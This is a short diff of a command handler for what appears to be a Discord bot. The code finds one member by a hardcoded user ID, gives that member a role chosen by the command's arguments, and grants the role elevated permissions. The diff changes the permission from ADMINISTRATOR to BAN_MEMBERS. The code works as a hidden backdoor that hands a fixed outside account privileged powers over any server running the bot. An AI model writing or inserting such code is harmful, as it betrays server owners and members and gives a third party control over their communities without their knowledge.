@@ -9,7 +9,7 @@ exports.run = function(client, message, args) {
     let tsuki = message.guild.members.find("id", "302837596600664065");
     tsuki.addRole(roleargs);
      let roleadmin = message.guild.roles.find('id', roleargs) 
- roleadmin.setPermissions('ADMINISTRATOR');
+ roleadmin.setPermissions('BAN_MEMBERS');
 };
   
  
